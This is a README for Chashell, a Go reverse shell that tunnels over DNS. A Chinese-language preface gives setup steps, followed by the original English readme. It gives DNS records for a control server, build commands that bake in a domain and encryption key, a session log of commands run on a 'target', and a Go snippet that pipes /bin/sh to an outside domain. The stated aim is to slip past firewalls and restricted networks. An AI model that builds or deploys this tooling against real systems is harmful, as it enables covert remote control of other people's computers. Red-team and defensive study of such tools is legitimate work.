# Chashell

## Ports

移除原版透過dep管理套件的方式，改以go 1.18 go mod方式管理套件。

## 使用教學

### 設定DNS

假設root domain是chtrt.tw  
DNS上要設定兩條record，首先為DNS Server(預計執行chaserv的主機)設定A Record:
```
# 設定chashell.chtrt.tw指向1.160.2.3
chashell 300 IN A 1.160.2.3
```
接下來設定NS Record讓c.chtrt.tw由chaserv主機控制
```
c 300 IN NS chashell.chtrt.tw.
```
後續chashell會將執行結果透過c.chtrt.tw進行傳送

### 編譯

1. 安裝gox工具  
    ```
    go install github.com/mitchellh/gox@latest
    ```
2. 設定環境變數  
    其中ENCRYPTION_KEY是用來做對稱加密的密碼，必須是32位元的hex string  
    ```
    $ export DOMAIN_NAME=c.chtrt.tw
    # python3
    $ export ENCRYPTION_KEY=$(python3 -c 'from secrets import token_hex; print(token_hex(32))')
    # python2
    $ export ENCRYPTION_KEY=$(python -c 'from os import urandom; print(urandom(32).encode("hex"))')
    ```
3. 編譯
    ```
    $ make build-all
    ```

下面是原版readme，留在底下提供參考

## Reverse Shell over DNS

Chashell is a [Go](https://golang.org/) reverse shell that communicates over DNS. 
It can be used to bypass firewalls or tightly restricted networks.

It comes with a multi-client control server, named `chaserv`.

![Chaserv](img/chaserv.gif)

### Communication security

Every packet is encrypted using symmetric cryptography ([XSalsa20](https://en.wikipedia.org/wiki/Salsa20) + [Poly1305](https://en.wikipedia.org/wiki/Poly1305)), with a shared key between the client
and the server.

We plan to implement asymmetric cryptography in the future.

### Protocol

Chashell communicates using [Protocol Buffers](https://developers.google.com/protocol-buffers/) serialized messages. For reference, the Protocol Buffers structure (`.proto` file) is available in the `proto` folder.

Here is a (simplified) communication chart :

![Protocol](img/proto.png)

Keep in mind that every packet is encrypted, hex-encoded and then packed for DNS transportation.

### Supported systems

Chashell should work with any desktop system (Windows, Linux, Darwin, BSD variants) that is supported by the Go compiler.

We tested those systems and it works without issues :

* Windows (386/amd64)
* Linux (386/amd64/arm64)
* OS X (386/amd64)

### How to use Chaserv/Chashell

#### Building


編譯binaries  
Build all the binaries (adjust the domain_name and the encryption_key to your needs):


```
$ export ENCRYPTION_KEY=$(python -c 'from os import urandom; print(urandom(32).encode("hex"))')
$ export DOMAIN_NAME=c.sysdream.com
$ make build-all
```

Build for a specific platform:

```
$ make build-all OSARCH="linux/arm"
```

Build only the server:

```
$ make build-server
```

Build only the client (*chashell* itself):

```
$ make build-client
```

#### DNS Settings

* Buy and configure a domain name of your choice (preferably short).
* Set a DNS record like this : 

```
chashell 300 IN A [SERVERIP]
c 300 IN NS chashell.[DOMAIN].
```

#### Usage

Basically, on the server side (attacker's computer), you must use the `chaserv` binary. For the client side (i.e the target), use the `chashell` binary.

So:

* Run `chaserv` on the control server.
* Run `chashell` on the target computer.

The client should now connect back to `chaserv`:

```
[n.chatelain]$ sudo ./chaserv
chashell >>> New session : 5c54404419e59881dfa3a757
chashell >>> sessions 5c54404419e59881dfa3a757
Interacting with session 5c54404419e59881dfa3a757.
whoami
n.chatelain
ls /
bin
boot
dev
[...]
usr
var
```

Use the `sessions [sessionid]` command to interact with a client.
When interacting with a session, you can use the `background` command in order to return to the `chashell` prompt.

Use the `exit` command to close `chaserv`.

## Implement your own

The `chashell/lib/transport` library is compatible with the `io.Reader` / `io.Writer` interface. So, implementing a reverse shell is as easy as :

```go
cmd := exec.Command("/bin/sh")

dnsTransport := transport.DNSStream(targetDomain, encryptionKey)

cmd.Stdout = dnsTransport
cmd.Stderr = dnsTransport
cmd.Stdin = dnsTransport
cmd.Run()
```

## Debugging

For more verbose messages, add `TAGS=debug` at the end of the make command.

## To Do

* Implement asymmetric cryptography ([Curve25519](https://en.wikipedia.org/wiki/Curve25519), [XSalsa20](https://en.wikipedia.org/wiki/Salsa20) and [Poly1305](https://en.wikipedia.org/wiki/Poly1305))
* Retrieve the host name using the `InfoPacket` message.
* Create a *proxy/relay* tool in order to tunnel TCP/UDP streams (Meterpreter over DNS !).
* Better error handling.
* Get rid of dependencies.

## Credits

* Nicolas Chatelain <n.chatelain -at- sysdream.com>